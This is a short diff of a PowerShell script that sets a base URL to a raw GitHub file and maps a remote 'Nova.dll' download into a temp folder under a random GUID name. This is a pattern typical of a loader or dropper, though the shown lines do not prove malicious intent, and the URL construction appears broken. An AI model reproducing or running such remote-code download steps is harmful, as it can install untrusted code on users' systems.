@@ -72,7 +72,7 @@ try {
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllPath = Join-Path $tempDir "$randomGuid.dll"
 
-$baseUrl = ""
+$baseUrl = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main/Nova.ps1"
 
 $files = @{
     $dllPath                          = "$baseUrl/Nova.dll"
